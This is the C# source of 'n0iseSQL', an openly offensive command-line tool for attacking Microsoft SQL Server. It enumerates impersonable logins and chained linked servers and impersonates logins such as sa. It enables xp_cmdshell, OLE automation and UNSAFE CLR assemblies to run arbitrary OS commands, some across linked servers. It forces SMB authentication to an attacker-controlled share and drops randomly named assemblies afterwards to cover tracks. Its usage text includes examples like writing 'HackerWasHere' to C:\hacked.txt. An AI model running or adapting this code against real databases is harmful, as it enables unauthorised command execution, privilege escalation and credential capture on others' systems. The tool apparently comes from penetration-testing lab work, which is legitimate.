using System;
using System.IO;
using System.Collections;
using System.Linq;
using System.Data.SqlClient;

namespace n0iseSQL
{
    internal class Program
    {

        private static Random random = new Random();

        public static string RandomString(int length)
        {
            //const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            //const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const string chars = "ABCDEFGHJKLMNPRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        static void Main(string[] args)
        {

            if (args.Length < 3)
            {
                Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
                Console.WriteLine();
                Console.WriteLine("actions:");
                Console.WriteLine("\tauthenticate");
                Console.WriteLine("\tconnectShare [smbShare] | example: connectShare \\\\server.domain.local\\share");
                Console.WriteLine("\tenumLoginImpersonation");
                Console.WriteLine("\tenumLinkedServers");
                Console.WriteLine("\texecuteOnLinkedServer [linkedServer] [execType:xp_cmdshell] [commandToRun]");
                Console.WriteLine("\texecuteOnServerLinkedToLinkedServer [linkedServer] [serverLinkedToLinkedServer] [execType:xp_cmdshell] [commandToRun]");
                Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly|loadAssemblyFromHexFile] [commandToRun] [assemblyPath|assemblyHexFile]");
                Console.WriteLine("\t\texample: impersonateLogin sa none");
                Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
                Console.WriteLine("\t\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
                Console.WriteLine("\t\texample: impersonateLogin sa loadOnServerStoredAssembly whoami \"C:\\OnServerFolder\\n0iseSQLExec.dll\"");
                Console.WriteLine("\t\texample: impersonateLogin sa loadAssemblyFromHex whoami \"C:\\OnAttackerFolder\\n0iseSQLExecDLLinHex.txt\"");
                Console.WriteLine("\timpersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");
                Console.WriteLine("\timpersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");


                return;
            }

            String action = args[2];

            if (action == "connectShare")
            {
                if (args.Length > 3)
                {
                    if (args[3].ToString().StartsWith("\\\\") == false)
                    {
                        Console.WriteLine("n0iseSQL.exe [sqlServer] [database] connectShare [smbShare] | example: connectShare \\\\server.domain.local\\share");
                        return;
                    }
                }
                else
                {
                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] connectShare [smbShare] | example: connectShare \\\\server.domain.local\\share");
                    return;
                }
            }

            if (action == "impersonateLogin")
            {
                if (args.Length < 5)
                {
                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
                    Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly|loadAssemblyFromHexFile] [commandToRun] [assemblyPath|assemblyHexFile]");
                    Console.WriteLine("\t\texample: impersonateLogin sa none");
                    Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
                    Console.WriteLine("\t\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
                    Console.WriteLine("\t\texample: impersonateLogin sa loadOnServerStoredAssembly whoami \"C:\\OnServerFolder\\n0iseSQLExec.dll\"");
                    Console.WriteLine("\t\texample: impersonateLogin sa loadAssemblyFromHexFile whoami \"C:\\OnAttackerFolder\\n0iseSQLExecDLLinHex.txt\"");
                    return;
                } else
                {
                    if (args[4].ToString() != "none")
                    {
                        if (args.Length < 6)
                        {
                            Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
                            Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa|loadOnServerStoredAssembly|loadAssemblyFromHexFile] [commandToRun] [assemblyPath|assemblyHexFile]");
                            Console.WriteLine("\t\texample: impersonateLogin sa none");
                            Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
                            Console.WriteLine("\t\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
                            Console.WriteLine("\t\texample: impersonateLogin sa loadOnServerStoredAssembly whoami \"C:\\OnServerFolder\\n0iseSQLExec.dll\"");
                            Console.WriteLine("\t\texample: impersonateLogin sa loadAssemblyFromHexFile whoami \"C:\\OnAttackerFolder\\n0iseSQLExecDLLinHex.txt\"");
                            return;
                        }
                    }
                }
            }

            if (action == "executeOnLinkedServer")
            {
                if (args.Length < 6)
                {
                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
                    Console.WriteLine("\texecuteOnLinkedServer [linkedServer] [execType:xp_cmdshell] [commandToRun]");
                    return;
                }
            }

            if (action == "executeOnServerLinkedToLinkedServer")
            {
                if (args.Length < 7)
                {
                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
                    Console.WriteLine("\texecuteOnServerLinkedToLinkedServer [linkedServer] [serverLinkedToLinkedServer] [execType:xp_cmdshell] [commandToRun]");
                    return;
                }
            }

            if (action == "impersonateUser")
            {
                if (args.Length < 5)
                {
                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
                    Console.WriteLine("\timpersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");
                    return;
                }
            }



            //String sqlServer = "data.cyber-rangers.lab";
            String sqlServer = args[0];
            //String database = "master";
            String database = args[1];

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            Console.WriteLine("[+] Connecting to sqlServer {0} to database {1}", sqlServer, database);
            try
            {
                con.Open();
                Console.WriteLine("{+] Authentication succeeded");
            }
            catch
            {
                Console.WriteLine("[!] Authentication failed");
                Environment.Exit(0);
            }

            String querylogin = "SELECT SYSTEM_USER;"; 
            SqlCommand command = new SqlCommand(querylogin, con); 
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Logged in as: " + reader[0]); 
            reader.Close();

            String queryuser = "SELECT USER_NAME();";
            command = new SqlCommand(queryuser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Mapped to user: " + reader[0]); //pokud Guest tak ten user nema primo login v ramci SQL
            reader.Close();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');"; 
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString()); if (role == 1)
            {
                Console.WriteLine("[+] User is a member of public role");
            }
            else
            {
                Console.WriteLine("[+] User is NOT a member of public role");
            }
            reader.Close();

            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString()); if (role == 1)
            {
                Console.WriteLine("[+] User is a member of sysadmin role");
            }
            else
            {
                Console.WriteLine("[+] User is NOT a member of sysadmin role");
            }
            reader.Close();

            if (action == "connectShare")
            {
                String smbShare = args[3].ToString();
                //pristup k SMB sharu utocnika
                Console.WriteLine("[+] Connecting to SMB share {0} using xp_dirtree...",smbShare);
                //String queryxpdirtree = "EXEC master..xp_dirtree \"\\\\10.10.10.113\\\\share\";";
                String queryxpdirtree = String.Format("EXEC master..xp_dirtree \"{0}\";", smbShare);
                //Console.WriteLine(queryxpdirtree);
                command = new SqlCommand(queryxpdirtree, con);
                try
                {
                    reader = command.ExecuteReader();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] {0}",ex.Message.ToString());
                }
                reader.Close();
            }

            if (action == "enumLoginImpersonation")
            {
                Console.WriteLine("[+] Enumerating logins that can be impersonated...");
                String queryImpersonation = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ";
                command = new SqlCommand(queryImpersonation, con);
                reader = command.ExecuteReader();
                while (reader.Read() == true)
                {
                    Console.WriteLine("[+] Logins that can be impersonated: " + reader[0]);
                }
                reader.Close();
            }

            if (action == "enumLinkedServers")
            {
                Console.WriteLine("[+] Enumerating linked servers...");
                ArrayList identifiedLinkedServers = new ArrayList();
                String queryLinkedServers = "EXEC sp_linkedservers;";
                command = new SqlCommand(queryLinkedServers, con);
                reader = command.ExecuteReader();
                while (reader.Read() == true)
                {
                    Console.WriteLine("[+] Linked SQL Server: " + reader[0]);
                    identifiedLinkedServers.Add(reader[0]);
                }
                reader.Close();

                foreach (String identifiedLinkedServer in identifiedLinkedServers)
                {
                    //sysadmins:
                    String queryLinkedServerSysadmins = String.Format("EXEC AS LOGIN = 'dev_int';select * from openquery(\"{0}\",'select name from master..syslogins');", identifiedLinkedServer);
                    command = new SqlCommand(queryLinkedServerSysadmins, con);
                    try
                    {
                        reader = command.ExecuteReader();
                        while (reader.Read())
                        {
                            Console.WriteLine("[+] sysadmin on linked server {0}: {1}", identifiedLinkedServer, reader[0]);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Error identifying sysadmin on linked server {0}: {1}", identifiedLinkedServer, ex.Message.ToString());
                    }

                    reader.Close();

                    //security context:
                    String queryLinkedServerContext = String.Format("select myuser from openquery(\"{0}\",'select SYSTEM_USER as myuser');", identifiedLinkedServer);
                    command = new SqlCommand(queryLinkedServerContext, con);
                    try
                    {
                        reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("[+] Linked SQL Server {0} connected as: {1}", identifiedLinkedServer, reader[0]);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Error identifying linked SQL Server {0} security context. {1}", identifiedLinkedServer, ex.Message.ToString());
                    }

                    reader.Close();

                    //version:
                    String queryLinkedServerVersion = String.Format("select version from openquery(\"{0}\",'select @@version as version');", identifiedLinkedServer);
                    command = new SqlCommand(queryLinkedServerVersion, con);
                    try
                    {
                        reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("[+] Linked SQL Server {0} version: {1}", identifiedLinkedServer, reader[0]);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Error identifying linked SQL Server {0} version. {1}", identifiedLinkedServer, ex.Message.ToString());
                    }
                    
                    reader.Close();

                    //linked servers on linked servers:
                    ArrayList identifiedLinkedServersOnLinkedServer = new ArrayList();
                    String queryLinkedServersOnLinkedServers = String.Format("EXEC ('sp_linkedservers') AT {0};", identifiedLinkedServer);
                    command = new SqlCommand(queryLinkedServersOnLinkedServers, con);
                    try
                    {
                        reader = command.ExecuteReader();
                        while (reader.Read())
                        {
                            Console.WriteLine("[+] Linked server on linked SQL Server {0}: {1}", identifiedLinkedServer, reader[0]);
                            identifiedLinkedServersOnLinkedServer.Add(reader[0]);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Error identifying linked servers on linked SQL Server {0}. {1}", identifiedLinkedServer, ex.Message.ToString());
                    }

                    reader.Close();

                    foreach (String identifiedLinkedServerOnLinkedServer in identifiedLinkedServersOnLinkedServer)
                    {
                        String queryLinkedServerOnLinkedServerContext = String.Format("select myuser from openquery(\"{0}\",'select myuser from openquery(\"{1}\",''select SYSTEM_USER as myuser'')');", identifiedLinkedServer, identifiedLinkedServerOnLinkedServer);


                        command = new SqlCommand(queryLinkedServerOnLinkedServerContext, con);
                        try
                        {
                            reader = command.ExecuteReader();
                            reader.Read();
                            Console.WriteLine("[+] Linked SQL Server {0} linked to SQL Server {1} was connected as: {2}", identifiedLinkedServerOnLinkedServer, identifiedLinkedServer, reader[0]);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[!] Error identifying security context of linked SQL Server {0} linked to SQL Server {1}. {2}", identifiedLinkedServerOnLinkedServer, identifiedLinkedServer, ex.Message.ToString());
                        }

                        reader.Close();
                    }
                }
            }

            if (action == "executeOnLinkedServer")
            {
                //  Console.WriteLine("n0iseSQL.exe [sqlServer] [database] [action] [additionalAguments]");
                //  Console.WriteLine("\texecuteOnLinkedServer [linkedServer] [execType:xp_cmdshell] [commandToRun]");

                String execType = args[4].ToString();
                String linkedServer = args[3].ToString();
                if (execType == "xp_cmdshell")
                {
                    String commandToRunOnLinkedServer = args[5].ToString();

                    Console.WriteLine("[+] Enabling advanced option on linked server {0}", linkedServer);
                    String enableAdvancedOptionsOnLinkedServer = String.Format("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT {0}",linkedServer);
                    command = new SqlCommand(enableAdvancedOptionsOnLinkedServer, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Enabling xp_cmdshell on linked server {0}", linkedServer);
                    String enableXp_cmdshellOnLinkedServer = String.Format("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT {0}", linkedServer);
                    command = new SqlCommand(enableXp_cmdshellOnLinkedServer, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Command executing on linked server {0} using xp_cmdshell: {1}", linkedServer, commandToRunOnLinkedServer);
                    String queryExecOnLinkedServer = String.Format("EXEC ('xp_cmdshell ''{0}'';') AT {1}", commandToRunOnLinkedServer, linkedServer);
                    command = new SqlCommand(queryExecOnLinkedServer, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("[+] Result of command executed on linked server {0}: {1}", linkedServer, reader[0]);
                    reader.Close();
                }

            }

            if (action == "executeOnServerLinkedToLinkedServer")
            {
                String execType = args[5].ToString();
                String linkedServer = args[3].ToString();
                String serverLinkedToLinkedServer = args[4].ToString();
                if (execType == "xp_cmdshell")
                {
                    String commandToRunOnServerLinkedToLinkedServer = args[6].ToString();

                    Console.WriteLine("[+] Enabling advanced option on Server {0} linked to linked server {1}", serverLinkedToLinkedServer, linkedServer);
                    String enableAdvancedOptionsOnServerLinkedToLinkedServer = String.Format("EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT {0}') AT {1}", serverLinkedToLinkedServer, linkedServer);
                    command = new SqlCommand(enableAdvancedOptionsOnServerLinkedToLinkedServer, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Enabling xp_cmdshell on Server {0} linked to linked server {1}", serverLinkedToLinkedServer, linkedServer);
                    String enableXp_cmdshellOnServerLinkedToLinkedServer = String.Format("EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT {0}') AT {1}", serverLinkedToLinkedServer, linkedServer);
                    command = new SqlCommand(enableXp_cmdshellOnServerLinkedToLinkedServer, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Command executing on Server {0} linked to linked server {1} using xp_cmdshell: {2}", serverLinkedToLinkedServer, linkedServer, commandToRunOnServerLinkedToLinkedServer);
                    String queryExecOnServerLinkedToLinkedServer = String.Format("EXEC ('EXEC (''xp_cmdshell ''''{0}'''';'') AT {1}') AT {2}", commandToRunOnServerLinkedToLinkedServer, serverLinkedToLinkedServer, linkedServer);
                    command = new SqlCommand(queryExecOnServerLinkedToLinkedServer, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("[+] Result of command executed on Server {0} linked to linked server {1}: {2}", serverLinkedToLinkedServer, linkedServer, reader[0]);
                    reader.Close();
                }

            }


            if (action == "impersonateLogin")
            {
                
                String execType = args[4].ToString();
                String loginToImpersonate = args[3].ToString();
                Console.WriteLine("[+] Impersonating login: {0}",loginToImpersonate);
                String executeas = String.Format("EXECUTE AS LOGIN = '{0}';",loginToImpersonate);
                command = new SqlCommand(executeas, con);
                try
                {
                    reader = command.ExecuteReader();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] {0}", ex.Message.ToString());
                }
                reader.Close();

                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[+] Now executing code as: " + reader[0]);
                reader.Close();

                if (execType == "xp_cmdshell")
                {
                    String commandToExecute = args[5].ToString();
                    Console.WriteLine("Command executing using xp_cmdshell: {0}", commandToExecute);
                    String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
                    String execCmd = String.Format("EXEC xp_cmdshell {0}",commandToExecute);

                    command = new SqlCommand(enable_xpcmd, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(execCmd, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("[+] Result of command is: " + reader[0]);
                    reader.Close();
                }

                if (execType == "sp_oa")
                {
                    String commandToExecute = args[5].ToString();
                    Console.WriteLine("Command executing using sp_oacreate and sp_oamethod: {0}", commandToExecute);
                    String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; ";
                    //String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Temp\\file.txt\"';";
                    String execCmd = String.Format("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{0}\"';",commandToExecute);

                    command = new SqlCommand(enable_ole, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(execCmd, con);
                    reader = command.ExecuteReader();
                    reader.Close();
                }

                if (execType == "loadOnServerStoredAssembly")
                {
                    String commandToExecute = args[5].ToString();
                    String onServerStoredAssemly = args[6].ToString(); //for example C:\OnServerFolder\n0iseSQLExec.dll
                    String randomAssemblyName = RandomString(8);
                    String randomProcedureName = RandomString(8);
                    //for SQL 2017+:
                    //String enable_options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
                    //for SQL2016-:
                    String enable_options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE;";
                    command = new SqlCommand(enable_options, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Creating assembly {0} using assembly stored locally on server {1}...", randomAssemblyName,onServerStoredAssemly);
                    //String createAsm = String.Format("CREATE ASSEMBLY {0} FROM 'C:\\FolderOnSQLServer\\n0iseSQLExec.dll' WITH PERMISSION_SET = UNSAFE",randomAssemblyName);
                    String createAsm = String.Format("CREATE ASSEMBLY {0} FROM '{1}' WITH PERMISSION_SET = UNSAFE", randomAssemblyName,onServerStoredAssemly);
                    command = new SqlCommand(createAsm, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Creating stored procedure {0}...", randomProcedureName);
                    String createPro = String.Format("CREATE PROCEDURE [dbo].[{0}] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [{1}].[StoredProcedures].[n0iseSQLExec];",randomProcedureName,randomAssemblyName);
                    command = new SqlCommand(createPro, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Executing command {0}", commandToExecute);
                    String assemblyExecCmd = String.Format("EXEC {0} '{1}'", randomProcedureName, commandToExecute);
                    command = new SqlCommand(assemblyExecCmd, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("[+] loadAssembly command execution result is: " + reader[0]);
                    reader.Close();

                    //cleanup
                    Console.WriteLine("[+] Dropping stored procedure {0}...", randomProcedureName);
                    String dropProcedure = String.Format("DROP PROCEDURE [dbo].[{0}];", randomProcedureName);
                    command = new SqlCommand(dropProcedure, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Dropping assembly {0}...", randomAssemblyName);
                    String dropAssembly = String.Format("DROP ASSEMBLY [{0}];", randomAssemblyName);
                    command = new SqlCommand(dropAssembly, con);
                    reader = command.ExecuteReader();
                    reader.Close();
                }

                if (execType == "loadAssemblyFromHexFile")
                {
                    String commandToExecute = args[5].ToString();
                    String hexAssemblyFile = args[6].ToString(); //convert dll to hex using ps1 script on git and provide path to txt file containing hex like 0xAD0983483...
                    String randomAssemblyName = RandomString(8);
                    String randomProcedureName = RandomString(8);
                    //for SQL 2017+:
                    //String enable_options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
                    //for SQL2016-:
                    String enable_options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE;";
                    command = new SqlCommand(enable_options, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Creating assembly {0} using hex assembly input...", randomAssemblyName);
                    String hexAssembly = File.ReadAllText(hexAssemblyFile);
                    String createAsm = String.Format("CREATE ASSEMBLY {0} FROM {1} WITH PERMISSION_SET = UNSAFE", randomAssemblyName, hexAssembly);
                    command = new SqlCommand(createAsm, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Creating stored procedure {0}...", randomProcedureName);
                    String createPro = String.Format("CREATE PROCEDURE [dbo].[{0}] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [{1}].[StoredProcedures].[n0iseSQLExec];", randomProcedureName, randomAssemblyName);
                    command = new SqlCommand(createPro, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Executing command {0}", commandToExecute);
                    String assemblyExecCmd = String.Format("EXEC {0} '{1}'", randomProcedureName, commandToExecute);
                    command = new SqlCommand(assemblyExecCmd, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("[+] loadAssembly command execution result is: " + reader[0]);
                    reader.Close();

                    //cleanup
                    Console.WriteLine("[+] Dropping stored procedure {0}...", randomProcedureName);
                    String dropProcedure = String.Format("DROP PROCEDURE [dbo].[{0}];", randomProcedureName);
                    command = new SqlCommand(dropProcedure, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("[+] Dropping assembly {0}...", randomAssemblyName);
                    String dropAssembly = String.Format("DROP ASSEMBLY [{0}];", randomAssemblyName);
                    command = new SqlCommand(dropAssembly, con);
                    reader = command.ExecuteReader();
                    reader.Close();
                }

            }

            if (action == "impersonateUser")
            {
                String userToImpersonate = args[4].ToString();
                String trustworthyDatabase = args[3].ToString();
                Console.WriteLine("[+] Impersonating user: {0}", userToImpersonate);
                Console.WriteLine("[+] Database with TRUSTWORTHY enabled: {0}", trustworthyDatabase);

                String executeasUser = String.Format("use {0}; EXECUTE AS USER = '{1}';", trustworthyDatabase, userToImpersonate);
                command = new SqlCommand(executeasUser, con);
                try
                {
                    reader = command.ExecuteReader();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] {0}", ex.Message.ToString());
                }
                reader.Close();

                command = new SqlCommand(queryuser, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[+] Now executing code as: " + reader[0]);
                reader.Close();
            }

            Console.WriteLine("[+] Done!");
            con.Close();
        }
    }
}
